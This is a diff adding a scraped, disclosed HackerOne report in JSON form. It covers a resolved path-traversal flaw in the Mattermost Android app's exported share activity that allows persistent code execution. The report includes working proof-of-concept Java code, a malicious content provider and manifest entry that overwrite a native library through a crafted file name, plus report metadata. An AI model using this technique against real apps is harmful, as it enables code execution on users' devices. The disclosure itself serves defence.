@@ -1,0 +1,218 @@
+{
+  "id": 1115864,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTE1ODY0",
+  "url": "https://hackerone.com/reports/1115864",
+  "title": "Persistant Arbitrary code execution in mattermost android",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-03-03T15:12:39.699Z",
+  "submitted_at": "2021-03-03T15:12:39.784Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hulkvision_",
+    "url": "/hulkvision_",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/PeXPbrzd2LRp46eQmaUCbxd3/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35268,
+    "url": "https://hackerone.com/mattermost",
+    "handle": "mattermost",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Mattermost",
+      "twitter_handle": "Mattermost",
+      "website": "https://mattermost.com",
+      "about": "Open-source collaboration, self-managed or SaaS"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-06-03T10:40:12.940Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-05-04T10:40:09.705Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nActivity `com.mattermost.share.ShareActivity` is is exported and is designed to allow file sharing from third party application to mattermost android app.\n```\n <activity android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:name=\"com.mattermost.share.ShareActivity\" android:taskAffinity=\"com.mattermost.share\" android:launchMode=\"singleInstance\" android:screenOrientation=\"portrait\" android:configChanges=\"keyboard|keyboardHidden|orientation|screenSize\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.SEND\"/>\n                <action android:name=\"android.intent.action.SEND_MULTIPLE\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <data android:mimeType=\"*/*\"/>\n            </intent-filter>\n        </activity>\n```\nI have found path tansversal vulnerability at `com.mattermost.share.RealPathUtil.java`  file \n```\npublic static String getPathFromSavingTempFile(Context context, final Uri uri) {\n             int nameIndex = returnCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME); //get file name here \n            returnCursor.moveToFirst();\n            fileName = returnCursor.getString(nameIndex); // \"filename=../../lib-main/libyoga.so\"\n        } catch (Exception e) {\n            // just continue to get the filename with the last segment of the path\n       }\n             String mimeType = getMimeType(uri.getPath());\n            tmpFile = new File(cacheDir, fileName);\n            tmpFile.createNewFile();  //path transversal here\n            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, \"r\"); \n            //.../\n```\nIt receives  the value of _display_name from the provider and saved the file with this name, leading to path-traversal.\n## Steps To Reproduce:\n  1. Install the POC app and open it. F1216351\n\n  On the next launch of the app the malicious code will be executed.In this poc the app will crash on next launch because i was too lazy and  to create a modified version of `libyoga.so`\n\n### POC \nIn `MainActivity.java`\n```\n        Intent intent = new Intent(Intent.ACTION_SEND);\n        intent.setClassName(\"com.mattermost.rn\", \"com.mattermost.share.ShareActivity\");\n        intent.putExtra(\"android.intent.extra.STREAM\",Uri.parse(\"content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so\"));\n        intent.setType(\"application/*\");\n        startActivity(intent);\n\n```\nIn `EvilContentProvider.java`\n```\npublic Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {\n    MatrixCursor matrixCursor = new MatrixCursor(new String[]{\"_display_name\"});\n    matrixCursor.addRow(new Object[]{uri.getQueryParameter(\"name\")});\n    return matrixCursor;\n}\n\npublic ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {\n    return ParcelFileDescriptor.open(new File(uri.getQueryParameter(\"path\")), ParcelFileDescriptor.MODE_READ_ONLY);\n}\n```\nIn `AndroidManifest.xml`\n```\n<provider android:name=\".EvilContentProvider\" android:authorities=\"com.example.android.pocok\" android:enabled=\"true\" android:exported=\"true\" />\n```\n\n## Impact\n\nAttacker can inject malicious library file in the application which will lead to arbitrary code execution in the app.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1216351,
+      "file_name": "app-release.apk",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z3s803kfwvel2cob25aboq7hb8iz?response-content-disposition=attachment%3B%20filename%3D%22app-release.apk%22%3B%20filename%2A%3DUTF-8%27%27app-release.apk&response-content-type=application%2Fvnd.android.package-archive&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXJSACSA3%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T063715Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMiJGMEQCIGkVMzf2yVHF5VadV2NaIIpmOBzW%2FcC4j58KJNkB6tOaAiBCSuyxSN67fBP0uiplt1RdLAD48HNYq%2Bi6IDKjHqj7xCqyBQgHEAMaDDAxMzYxOTI3NDg0OSIMyGdo6teUi9jc4fWCKo8FzpmGD1P5HQFWR99hcdZhljfWBF%2Fit%2FdaOdqWcTeG%2Bs0k8pjPdhDM9d4ydydFHdY%2FU%2FEWb7hEVp%2FNUSpg70DhyutK4HabhgUsCbHAc4UWkGzdH%2B8WBNdwONjSp%2Fl7UcWGRX6uz7Q8wAJoZjIyiCOgiuTVTIIo2%2FubP94ixbLTyz7FYj0Cge%2FRvvZxButl6I3uEfARaOVX1tguGj6GRuOJIUhjP0H9WB43IQ70z7BQSINdBTRqq84pmUpOW94FmfKyTO6CLgLQLBEuDARgHB%2Bo2BUlclH3vSDYik8A%2FegBSBrANgDeM563ZJYze4LSizaicOfHSz0jl3PEQrzIlxbplFZUhLGS934CfhuQfqFE2WRJWulG8s7GTxV%2BwTds%2Bg1W8RYSyCOE8%2BoQzkOo8dpwCYVjSimLwUtWx8%2BT5EoU1eQPsga%2FMEjhi4XGKFtKAerWhf2gT7s9WaNq22yrg1ISTU%2BGxNdTOZu%2BLyVdX72vvFAFLHLOEy2q1PtvDCsQdGa06lfHcWnrOaSalpOEQw2NWfx8A1uA3AX2fdFLPh5SfIzMRgvD9AGS4fkSd5s5RbH7cZhLXrUoG4rghYZJAOvItMvq5tzaSBZOO7%2B5w1p7bmI7Sii1RTRvWouGUtWZriv8Va9LElYvtv8OIkVKmi2tZL6ouKpP7MZdOwYnTiHpVDWYCmjgWXhqlEERmczFh7OhawdtT7PAMpzeR6ABBVNLI5nu%2B8iw8Lq1h6jkJx86Ss7ZMmSeAJMOz8nu5crfdPTgGC7Lvl2tCnFVsIkxa%2BSVsxJRVDo4tDwOE1AEuY8TVBKMuV8B8Naewsv1ReYmQBOyoeMvamnqATu8gFU285bPxwxTT9YvFmkGJdcZFd8jqjDloJ3SBjqyAT854AUpI%2BOafSYvwipEDpY%2Bh%2BxQgLUBLryC32p6jI3c0kwcIjaF%2FK2hbyiVHI9LaEf47MfhB%2B4kZTlj2d5ApGCAnCe5D8Wsz7OeSGsofI54bPzTe%2FusRTEdkqNftH0RRSELiMvoY8ZTFRglxVcAscW75GdUzrFl6M2f8YNta1QpO%2FvOPo49AeMULJ0ezTNbo52GNgFnLANWlabC1YB%2Bs7CCL2aWx3BJTEF5R1JQ%2B6nEBGA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=180b25b5bd85208a8a2f2c732636a07e29c2b380f579cac421e68364c1c67a6c",
+      "file_size": 2525861,
+      "type": "application/vnd.android.package-archive",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-06-03T10:40:09.778Z",
+  "allow_singular_disclosure_after": -160343825.46355948,
+  "singular_disclosure_allowed": true,
+  "vote_count": 66,
+  "voters": [
+    "osman1337",
+    "holyfield",
+    "run_win",
+    "tess",
+    "hulkvision_",
+    "thalaivar304",
+    "imranhudaa",
+    "anupamas01",
+    "akashhamal0x01",
+    "tomtenisse",
+    "and 56 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 17024,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "mattermost/mattermost-mobile",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1115864",
+  "votes": 66,
+  "latest_disclosable_activity_at": "2021-06-03T10:40:13.008Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T14:37:15.339689",
+    "source": "https://hackerone.com/reports/1115864.json",
+    "report_id": 1115864
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTE1ODY0",
+    "databaseId": "1115864",
+    "title": "Persistant Arbitrary code execution in mattermost android",
+    "url": "https://hackerone.com/reports/1115864",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2021-06-03T10:40:12.940Z",
+    "created_at": "2021-03-03T15:12:39.699Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzcw",
+      "name": "Code Injection",
+      "external_id": "cwe-94"
+    },
+    "severity": {
+      "rating": "high",
+      "score": 7.8
+    },
+    "reporter": {
+      "username": "hulkvision_"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1MjY4",
+      "handle": "mattermost",
+      "name": "Mattermost",
+      "url": "https://hackerone.com/mattermost",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yODExNjQ=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2021-03-05T07:22:11.260Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzExMTU4NjQ=",
+    "_id": "1115864",
+    "disclosed": true,
+    "votes": 66,
+    "latest_disclosable_activity_at": "2021-06-03T10:40:13.008Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTE1ODY0",
+      "databaseId": "1115864",
+      "title": "Persistant Arbitrary code execution in mattermost android",
+      "url": "https://hackerone.com/reports/1115864",
+      "disclosed_at": "2021-06-03T10:40:12.940Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1MjY4",
+      "handle": "mattermost",
+      "name": "Mattermost",
+      "url": "https://hackerone.com/mattermost",
+      "currency": "usd"
+    }
+  }
+}
